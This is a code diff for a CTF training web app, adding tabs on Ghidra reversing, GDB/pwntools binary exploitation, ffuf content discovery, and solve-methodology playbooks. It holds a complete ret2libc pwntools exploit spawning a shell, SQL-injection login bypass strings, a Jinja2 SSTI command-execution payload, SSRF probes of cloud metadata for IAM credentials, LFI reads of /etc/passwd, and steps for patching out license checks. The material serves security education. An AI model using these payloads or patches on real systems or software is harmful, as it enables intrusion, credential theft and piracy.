+              <td>Document disassembled logic directly in the Listing and Decompiler windows.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="grid cols-2" style="gap:16px;margin:16px 0">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Binary Patching (Bypassing License Checks)</h4>
+          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li>Locate the decision jump in the Listing (e.g. <code>JNZ LAB_00401250</code> right after <code>strcmp</code>).</li>
+            <li>Right click instruction &rarr; <strong>Patch Instruction</strong> (or press <code>Ctrl+Shift+G</code>).</li>
+            <li>Change <code>JNZ</code> to <code>JZ</code>, or replace with <code>NOP</code> sleds (<code>90 90</code>).</li>
+            <li>Alternatively, patch validation function: change first instruction to <code>MOV EAX, 1; RET</code>.</li>
+            <li>Export patched binary: <em>File &rarr; Export Program &rarr; Format: Binary</em>, save, and <code>chmod +x patched_bin</code>.</li>
+          </ol>
+        </div>
+
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Automated Keygenning with Z3 Solver</h4>
+          <p style="color:#aeb6c5;font-size:12px;margin:0 0 6px">When Ghidra shows 30+ math equations comparing user input, do not solve by hand!</p>
+          <pre><code>from z3 import *
+s = Solver()
+flag = [BitVec(f'c_{i}', 8) for i in range(24)]
+# Printable ASCII constraints
+for c in flag: s.add(c >= 32, c <= 126)
+# Paste equations from Ghidra decompiler:
+s.add(flag[0] == ord('C'))
+s.add((flag[1] ^ flag[2]) + flag[3] == 0x9f)
+if s.check() == sat:
+    m = s.model()
+    print(''.join(chr(m[c].as_long()) for c in flag))</code></pre>
+        </div>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'pwn' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">BINARY EXPLOITATION</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">GDB + GEF &amp; Pwntools Masterclass</h3>
+          <p style="color:#aeb6c5;font-size:13px">The industry-standard pwn stack: GDB with GEF (GDB Enhanced Features) for dynamic debugging and Pwntools for automated exploit development.</p>
+        </div>
+        <button class="btn" data-textbook="pwn-start-to-end">📖 Read Pwn Chapter</button>
+      </div>
+
+      <div class="cmd-table-wrap">
+        <table class="cmd-table">
+          <thead>
+            <tr>
+              <th>GEF Command</th>
+              <th>What It Does</th>
+              <th>How to Use It in CTF Challenges</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>checksec</code></td>
+              <td>Audits binary mitigations</td>
+              <td>Tells you immediately: Canary? NX (need ROP)? PIE (randomized addresses)? RELRO?</td>
+            </tr>
+            <tr>
+              <td><code>pattern create 200</code></td>
+              <td>Generates de Bruijn cyclic string</td>
+              <td>Feed to binary to crash it and find exact return address overwrite offset.</td>
+            </tr>
+            <tr>
+              <td><code>pattern offset $rsp</code></td>
+              <td>Calculates exact padding offset</td>
+              <td>Reports exact bytes needed before overwriting <code>$rip</code> (e.g. <code>Found at offset 72</code>).</td>
+            </tr>
+            <tr>
+              <td><code>telescope $rsp 20</code></td>
+              <td>Deep stack inspection</td>
+              <td>Inspects 20 stack frames, resolving pointers to symbols, strings, and libc addresses.</td>
+            </tr>
+            <tr>
+              <td><code>vmmap</code></td>
+              <td>Memory permissions map</td>
+              <td>Shows virtual memory layout: which sections are readable, writable, or executable (RWX).</td>
+            </tr>
+            <tr>
+              <td><code>registers</code></td>
+              <td>Color-coded register dump</td>
+              <td>Displays RAX, RBX, RCX, RDX, RSI, RDI, RSP, RIP with smart pointer dereferencing.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h4 style="color:var(--green);margin:0 0 8px">The Ultimate Pwntools Python Boilerplate (Ret2libc / ROP)</h4>
+        <pre><code>#!/usr/bin/env python3
+from pwn import *
+
+# Set target binary architecture and debug context
+exe = './vuln_binary'
+elf = context.binary = ELF(exe, checksec=False)
+context.terminal = ['tmux', 'splitw', '-h']
+
+# Toggle local vs remote target dynamically
+if args.REMOTE:
+    io = remote('challenge.ctf.server', 1337)
+    libc = ELF('./libc.so.6', checksec=False)
+else:
+    io = process(exe)
+    libc = elf.libc
+
+# 1. Stage 1: Leak Libc address via puts@got
+offset = 72
+rop = ROP(elf)
+rop.puts(elf.got['puts'])
+rop.call(elf.symbols['main'])  # Loop back to main for second stage
+
+io.sendlineafter(b'Input: ', b'A' * offset + rop.chain())
+leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
+libc.address = leaked_puts - libc.symbols['puts']
+log.success(f"Libc Base Address: {hex(libc.address)}")
+
+# 2. Stage 2: Return to system('/bin/sh') with 16-byte stack alignment
+rop2 = ROP(libc)
+rop2.raw(rop.find_gadget(['ret'])[0]) # Stack align for movaps SSE
+rop2.system(next(libc.search(b'/bin/sh\x00')))
+
+io.sendlineafter(b'Input: ', b'A' * offset + rop2.chain())
+io.interactive()</code></pre>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'dirbust' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">CONTENT DISCOVERY</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Content &amp; Endpoint Discovery (ffuf, Gobuster, Feroxbuster)</h3>
+          <p style="color:#aeb6c5;font-size:13px">Why DirBuster GUI is obsolete and how modern Go/Rust fuzzers unearth hidden admin routes, API endpoints, backups, and virtual hosts at 100x speed.</p>
+        </div>
+      </div>
+
+      <div class="grid cols-3" style="gap:16px;margin:16px 0">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">1. Directory &amp; File Fuzzing</h4>
+          <pre><code>ffuf -u http://target/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -e .php,.html,.bak,.swp,.txt,.json \
+  -mc 200,301,302,403</code></pre>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">2. Virtual Host (VHost) Fuzzing</h4>
+          <pre><code>ffuf -u http://target.ctf \
+  -H "Host: FUZZ.target.ctf" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs 1420  # Filter wildcard page size</code></pre>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 6px">3. Hidden Parameter Fuzzing</h4>
+          <pre><code>ffuf -u 'http://target/api/test?FUZZ=1' \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mc 200 -fs 512</code></pre>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4 style="color:var(--green);margin:0 0 8px">Mastering Noise Filtering (Eliminating False Positives)</h4>
+        <p style="color:#aeb6c5;font-size:13px;margin:0 0 10px">When target servers return HTTP 200 for every URL (wildcard routing), traditional scanners get clogged with thousands of junk hits. Use ffuf's fine-grained filter flags:</p>
+        <div class="grid cols-4" style="gap:12px;font-size:12px">
+          <div><code style="color:var(--accent)">-fc 404,403</code><br><span style="color:#aeb6c5">Filters specific status codes</span></div>
+          <div><code style="color:var(--accent)">-fs 1530</code><br><span style="color:#aeb6c5">Filters exact response size (bytes)</span></div>
+          <div><code style="color:var(--accent)">-fw 42</code><br><span style="color:#aeb6c5">Filters exact word count</span></div>
+          <div><code style="color:var(--accent)">-fl 18</code><br><span style="color:#aeb6c5">Filters exact line count</span></div>
+        </div>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'quickflag' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">TACTICAL TRIAGE</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">🎯 'Quick Flag' Decision Matrix: Where to Use What Tool</h3>
+          <p style="color:#aeb6c5;font-size:13px">When staring at a fresh CTF challenge, do not guess blindly. Use this tactical decision matrix to select the exact right toolchain and immediate first command.</p>
+        </div>
+      </div>
+
+      <div class="cmd-table-wrap" style="margin-top:16px">
+        <table class="cmd-table">
+          <thead>
+            <tr>
+              <th>What You Are Given</th>
+              <th>Primary Toolchain</th>
+              <th>Immediate First Command</th>
+              <th>Expected Indicator of Success</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Unknown binary or mystery file</strong></td>
+              <td><code>file</code>, <code>strings</code>, <code>binwalk</code></td>
+              <td><code>file target && strings -n 8 target | grep -Ei "flag|key"</code></td>
+              <td>Identifies file format or exposes hardcoded flag in plaintext.</td>
+            </tr>
+            <tr>
+              <td><strong>Web login form</strong></td>
+              <td>Burp Suite Repeater</td>
+              <td>Inject <code>' OR 1=1 -- -</code> or <code>admin' --</code> into username</td>
+              <td>Bypasses authentication into administrator dashboard.</td>
+            </tr>
+            <tr>
+              <td><strong>Image or audio file (Stego)</strong></td>
+              <td><code>exiftool</code>, <code>zsteg</code>, <code>steghide</code></td>
+              <td><code>exiftool img.png; zsteg -a img.png; steghide extract -sf img.jpg</code></td>
+              <td>Exposes embedded comments, LSB color channel flags, or ZIP archive.</td>
+            </tr>
+            <tr>
+              <td><strong>Network packet capture (.pcap)</strong></td>
+              <td>Wireshark, <code>tshark</code></td>
+              <td>Filter: <code>http contains "flag" || tcp.stream eq 0</code></td>
+              <td>Reconstructs HTTP downloads, credentials, or exfiltrated data.</td>
+            </tr>
+            <tr>
+              <td><strong>Stripped 64-bit ELF binary</strong></td>
+              <td>Ghidra + GDB/GEF</td>
+              <td>Ghidra: find <code>__libc_start_main</code> to locate <code>main</code>; GDB: break before <code>strcmp</code></td>
+              <td>Dumps runtime-decrypted flag sitting in registers (<code>$rsi</code>/<code>$rdi</code>).</td>
+            </tr>
+            <tr>
+              <td><strong>Binary with buffer overflow (NX disabled)</strong></td>
+              <td>GEF + Pwntools</td>
+              <td><code>gef> pattern create 200</code> &rarr; <code>shellcraft.sh()</code> on stack</td>
+              <td>Executes shellcode on stack, spawning interactive <code>/bin/sh</code>.</td>
+            </tr>
+            <tr>
+              <td><strong>Binary with buffer overflow (NX enabled)</strong></td>
+              <td>Pwntools ROP / Ret2libc</td>
+              <td>Stage 1: Leak <code>puts@got</code>; Stage 2: <code>system('/bin/sh')</code></td>
+              <td>Bypasses non-executable stack to spawn root shell.</td>
+            </tr>
+            <tr>
+              <td><strong>Web app reflecting username ("Hello {name}")</strong></td>
+              <td>Burp Repeater</td>
+              <td>Inject <code>{{7*7}}</code> (Jinja2/Twig) or <code>${7*7}</code> (Spring)</td>
+              <td>Renders <code>49</code>, confirming Server-Side Template Injection (SSTI).</td>
+            </tr>
+            <tr>
+              <td><strong>Web app taking URL (?url=http://...)</strong></td>
+              <td>Burp + <code>interactsh</code></td>
+              <td>Inject <code>http://169.254.169.254/latest/meta-data/</code> or <code>http://127.0.0.1:80/</code></td>
+              <td>Discloses cloud IAM credentials or internal microservices (SSRF).</td>
+            </tr>
+            <tr>
+              <td><strong>Encoded / obfuscated text string</strong></td>
+              <td>CyberChef</td>
+              <td>Load CyberChef &rarr; Apply "Magic" recipe &rarr; Test Base64, ROT13, Hex</td>
+              <td>Automatically recognizes encoding layers and decodes flag.</td>
+            </tr>
+            <tr>
+              <td><strong>Low-privilege Linux SSH shell</strong></td>
+              <td>Bash / GTFOBins</td>
+              <td><code>sudo -l; find / -perm -u=s -type f 2>/dev/null; getcap -r / 2>/dev/null</code></td>
+              <td>Discovers SUID binary or capability yielding instant root escalation.</td>
+            </tr>
+            <tr>
+              <td><strong>Windows memory dump (.raw, .vmem)</strong></td>
+              <td>Volatility 3</td>
+              <td><code>python3 vol.py -f dump.raw windows.pslist; windows.cmdline</code></td>
+              <td>Extracts running processes, command lines, and injected malware DLLs.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </article>
+  ` : ''}
+  `;
 }
 
 function labsHTML() {
@@ -1104,6 +1618,8 @@ function labsHTML() {
 }
 
 function playbookHTML() {
+  const tab = state.playbookTab || 'universal';
+
   const steps = [
     {n:'01',title:'Triage',items:['Identify category (crypto, web, pwn, forensics, OSINT, stego, reverse).','Read the problem statement twice. Highlight concrete clues.','List what artifacts you have: file, URL, service, image, pcap.']},
     {n:'02',title:'Gather evidence',items:['Run the minimal set of observation commands for the category.','Capture all output. Do not interpret yet—just collect.','Check file types, sizes, magic bytes, strings, entropy.']},
@@ -1112,9 +1628,205 @@ function playbookHTML() {
     {n:'05',title:'Exploit & extract',items:['Apply the narrowest proof-of-concept that produces the flag.','Verify the flag format before submitting.','Record the minimal reproduction: file + one command = flag.']},
     {n:'06',title:'Write it up',items:['Root cause → exploit chain → flag → defensive lesson.','3–8 sentences is enough. Include the key command.','Map to ATT&CK if it\'s an offensive technique.']}
   ];
-  return `<div class="section-head"><div><h2>Methodology</h2><p>A repeatable solve loop that works across every CTF category.</p></div></div>
-  <div class="playbook">${steps.map(s=>`<div class="play-card card"><div class="card-top"><span class="tag accent">${s.n}</span><h3>${s.title}</h3></div><ol>${s.items.map(i=>`<li>${i}</li>`).join('')}</ol></div>`).join('')}</div>
-  <div class="note" style="margin-top:24px"><strong>Anti-patterns to avoid:</strong> Running every tool without a hypothesis. Accepting tool output as ground truth without verification. Giving up before checking the simplest explanation. Sharing flags or solutions in active competitions.</div>`;
+
+  return `
+  <div class="section-head">
+    <div>
+      <div class="eyebrow">METHODOLOGY // REPEATABLE CTF SOLVE LIFECYCLES</div>
+      <h2>Challenge Start-to-End Solve Lifecycles</h2>
+      <p>Tactical, battle-tested playbooks for Web Exploitation, Reverse Engineering, Binary Exploitation (Pwn), and the Universal 6-Step Loop. Learn how to assume at starting, formulate falsifiable hypotheses, avoid rabbit holes, and conclude with surgical flag extraction.</p>
+    </div>
+    <div class="tag-row">
+      <span class="tag accent">4 solve lifecycles</span>
+      <span class="tag success">start-to-end</span>
+      <span class="tag warn">falsifiable testing</span>
+    </div>
+  </div>
+
+  <div class="os-tabs" style="margin-bottom:18px">
+    ${[
+      ['universal', 'Universal 6-Step Solve Loop'],
+      ['web', 'Web Exploitation Lifecycle (Start to Flag)'],
+      ['reverse', 'Reverse Engineering Lifecycle (Start to Flag)'],
+      ['pwn', 'Binary Exploitation (Pwn) Lifecycle']
+    ].map(([key, label]) => `
+      <button class="os-btn${tab === key ? ' active' : ''}" data-playbook-tab="${key}">${label}</button>
+    `).join('')}
+  </div>
+
+  ${tab === 'universal' ? `
+    <div class="playbook">
+      ${steps.map(s => `
+        <div class="play-card card">
+          <div class="card-top">
+            <span class="tag accent">${s.n}</span>
+            <h3>${s.title}</h3>
+          </div>
+          <ol>${s.items.map(i => `<li>${i}</li>`).join('')}</ol>
+        </div>
+      `).join('')}
+    </div>
+    <div class="note" style="margin-top:24px">
+      <strong>Anti-patterns to avoid:</strong> Running every tool without a hypothesis. Accepting tool output as ground truth without manual verification. Giving up before checking the simplest explanation. Sharing flags or solutions in active competitions.
+    </div>
+  ` : ''}
+
+  ${tab === 'web' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">LIFECYCLE 01 // WEB EXPLOITATION</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Web Exploitation: From First HTTP Request to Flag Extraction</h3>
+          <p style="color:#aeb6c5;font-size:13px">How to approach unknown web applications: technology fingerprinting, attack surface mapping, formulating hypotheses, concluding true positives, and weaponizing payloads in Burp Suite.</p>
+        </div>
+        <button class="btn" data-textbook="web-start-to-end">📖 Read Full Web Chapter</button>
+      </div>
+
+      <div class="grid cols-2" style="gap:16px;margin:20px 0">
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Phase 1: How to Assume at Starting (Tech Profiling)</h4>
+          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Never guess randomly. Match the identified tech stack to its natural vulnerability vectors:</p>
+          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>PHP / Apache:</strong> Look for Local File Inclusion (<code>include($_GET['page'])</code>), PHP stream wrappers (<code>php://filter</code>), and file upload extension bypasses.</li>
+            <li><strong>Node.js / Express:</strong> Look for Prototype Pollution (<code>__proto__</code>), NoSQL injection (<code>{"$gt": ""}</code>), and JWT algorithm confusion (<code>"alg": "none"</code>).</li>
+            <li><strong>Python / Flask:</strong> Look for Server-Side Template Injection (Jinja2 <code>{{cycler...}}</code>), and Python Pickle / YAML deserialization.</li>
+            <li><strong>Java / Spring:</strong> Look for Spring Expression Language (SpEL) injection, Log4j/Logback OOB JNDI, and Java serialized objects.</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <h4 style="color:var(--green);margin:0 0 8px">Phase 2: Attack Surface &amp; Input Point Mapping</h4>
+          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
+            <li><strong>Passive Recon:</strong> Check <code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/.git/HEAD</code>, and HTML source comments for hidden endpoints.</li>
+            <li><strong>Content Discovery:</strong> Run <code>ffuf -u http://target/FUZZ -w raft-medium-directories.txt -mc 200,301 -fs 0</code>.</li>
+            <li><strong>Input Cataloging:</strong> Catalog every parameter in GET queries (<code>?id=</code>), POST bodies (JSON, form-urlencoded), and HTTP headers (<code>User-Agent</code>, <code>X-Forwarded-For</code>).</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="card" style="margin-bottom:20px">
+        <h4 style="color:var(--green);margin:0 0 8px">Phase 3 &amp; 4: How to Formulate &amp; Conclude Specific Vulnerabilities</h4>
+        <div class="cmd-table-wrap">
+          <table class="cmd-table">
+            <thead>
+              <tr>
+                <th>Vulnerability</th>
+                <th>How to Test (Hypothesis)</th>
+                <th>How to Conclude (Root Cause Proof)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>SQL Injection</strong></td>
+                <td>Inject <code>'</code> and check for 500 error; inject <code>' OR '1'='1</code> vs <code>' OR '1'='2</code>.</td>
+                <td>Time-based test: inject <code>'; SELECT SLEEP(5)-- -</code>. If response takes exactly 5.05s vs 0.05s on <code>SLEEP(0)</code>, SQLi is 100% concluded.</td>
+              </tr>
+              <tr>
+                <td><strong>SSTI</strong></td>
+                <td>Inject <code>{{7*7}}</code>. If output is <code>49</code>, inject <code>{{7*'7'}}</code>.</td>
+                <td>If <code>49</code> -> Twig (PHP). If <code>7777777</code> -> Jinja2 (Python). Escalate to <code>{{cycler.__init__.__globals__.os.popen('id').read()}}</code>.</td>
+              </tr>
+              <tr>
+                <td><strong>Local File Inclusion (LFI)</strong></td>
+                <td>Inject <code>../../../../etc/passwd</code> or <code>php://filter/convert.base64-encode/resource=index.php</code>.</td>
+                <td>Base64 response decodes to raw PHP source code, confirming arbitrary file disclosure.</td>
+              </tr>
+              <tr>
+                <td><strong>SSRF</strong></td>
+                <td>Inject <code>http://169.254.169.254/latest/meta-data/</code> or loopback <code>http://127.0.0.1:80/</code>.</td>
+                <td>Backend reflects AWS IAM credentials or internal admin panels unreachable externally.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'reverse' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">LIFECYCLE 02 // REVERSE ENGINEERING</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Reverse Engineering: From 30-Second Triage to Ghidra &amp; Z3</h3>
+          <p style="color:#aeb6c5;font-size:13px">Deconstructing compiled binaries: the 30-second triage, Ghidra static analysis, GDB dynamic hooking, and algorithmic keygenning with the Z3 theorem prover.</p>
+        </div>
+        <button class="btn" data-textbook="reverse-start-to-end">📖 Read Reversing Chapter</button>
+      </div>
+
+      <div class="grid cols-4" style="gap:16px;margin:20px 0">
+        <div class="card">
+          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">1. 30-Second Triage</h4>
+          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">Run <code>file</code> (ELF vs PE, stripped?), <code>checksec</code>, <code>strings -n 8</code>, and <code>ltrace -s 128 ./bin</code>. If <code>strcmp</code> is used, the flag appears in plaintext in ltrace!</p>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">2. Static Analysis in Ghidra</h4>
+          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">Locate <code>main</code> (or follow <code>__libc_start_main</code>). Rename variables with <code>L</code>, retype with <code>Ctrl+L</code>. Identify validation loop (XOR, additive, or rolling state).</p>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">3. GDB Dynamic Hooking</h4>
+          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">If the binary decrypts the flag in RAM, don't reverse the math! Set breakpoint before comparison (<code>b *main+0x84</code>) and dump registers (<code>x/s $rsi</code>).</p>
+        </div>
+        <div class="card">
+          <h4 style="color:var(--green);font-size:14px;margin:0 0 6px">4. Z3 SMT Keygenning</h4>
+          <p style="font-size:12px;color:#aeb6c5;line-height:1.5">If 20+ non-linear constraints compare user input, extract equations into Python, define Z3 <code>BitVec</code> variables, and let the SMT solver compute the flag in 0.1s.</p>
+        </div>
+      </div>
+    </article>
+  ` : ''}
+
+  ${tab === 'pwn' ? `
+    <article class="writeup-card">
+      <div class="card-top">
+        <div>
+          <span class="tag accent">LIFECYCLE 03 // BINARY EXPLOITATION</span>
+          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Binary Exploitation (Pwn): Mitigation Audit to Remote Shell</h3>
+          <p style="color:#aeb6c5;font-size:13px">Systematic memory corruption tradecraft: mitigation mapping, cyclic offset calculation, exploit primitive selection (Ret2win, Ret2libc, Shellcode, Format String), and weaponized Pwntools scripts.</p>
+        </div>
+        <button class="btn" data-textbook="pwn-start-to-end">📖 Read Pwn Chapter</button>
+      </div>
+
+      <div class="cmd-table-wrap" style="margin:20px 0">
+        <table class="cmd-table">
+          <thead>
+            <tr>
+              <th>Mitigation State</th>
+              <th>Vulnerability Context</th>
+              <th>Optimal Attack Primitive</th>
+              <th>Exploit Strategy</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>NX: Disabled, PIE: No</code></td>
+              <td>Stack buffer overflow</td>
+              <td><strong>Shellcode on Stack</strong></td>
+              <td>Put <code>shellcraft.sh()</code> in buffer, overwrite return address with buffer address or <code>jmp rsp</code> gadget.</td>
+            </tr>
+            <tr>
+              <td><code>NX: Enabled, PIE: No</code></td>
+              <td>Hidden <code>win()</code> / <code>backdoor()</code> function</td>
+              <td><strong>Ret2win</strong></td>
+              <td>Pad buffer to offset (<code>72 bytes</code>) + <code>p64(win_address)</code>. Stack-align with extra <code>ret</code> gadget if Ubuntu 20+.</td>
+            </tr>
+            <tr>
+              <td><code>NX: Enabled, PIE: No/Yes</code></td>
+              <td>Standard overflow, no win function</td>
+              <td><strong>Ret2libc (2-Stage ROP)</strong></td>
+              <td>Stage 1: Call <code>puts(puts@got)</code> to leak Libc base; Stage 2: Call <code>system('/bin/sh')</code>.</td>
+            </tr>
+            <tr>
+              <td><code>RELRO: Partial, Canary: Yes</code></td>
+              <td><code>printf(user_buf)</code></td>
+              <td><strong>Format String Exploit</strong></td>
+              <td>Leak canary &amp; Libc with <code>%p</code>; overwrite GOT entry (e.g. <code>exit@got</code> &rarr; <code>win</code>) using <code>fmtstr_payload()</code>.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </article>
+  ` : ''}
+  `;
 }
 
 function casebookHTML() {
@@ -1338,8 +2050,12 @@ function tricksHTML() {
       ['chaining', 'Command Chaining (; && ||)'],
       ['whitespace', 'Whitespace Evasion ($IFS)'],
       ['obfuscation', 'Keyword Evasion (c\\at glob)'],
-      ['web', 'Web & Injection (SQLi/XSS/SSRF)'],
-      ['privesc', 'SUID & GTFOBins'],
+      ['evasion', 'WAF & Shell Evasion'],
+      ['web', 'Web Injection'],
+      ['polyglots', 'Web Polyglots & Bypasses'],
+      ['privesc', 'SUID & GTFOBins Privesc'],
+      ['linux-recon', 'Linux CTF Recon & Snooping'],
+      ['transfers', 'File Transfers & Exfil'],
       ['shells', 'Interactive Shells & PTY']
     ].map(([catKey, label]) => `
       <button class="os-btn${tab === catKey ? ' active' : ''}" data-tricks-tab="${catKey}">${label}</button>
@@ -1823,6 +2539,23 @@ function bindViewEvents() {
       state.curriculumModule = btn.dataset.curriculumModule;
       render();
       window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  });
+
+  /* OS selector */
+  /* Tool Academy tabs */
+  view.querySelectorAll('[data-tool-tab]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      state.toolTab = btn.dataset.toolTab;
+      render();
+    });
+  });
+
+  /* Playbook lifecycle tabs */
+  view.querySelectorAll('[data-playbook-tab]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      state.playbookTab = btn.dataset.playbookTab;
+      render();
     });
   });
 
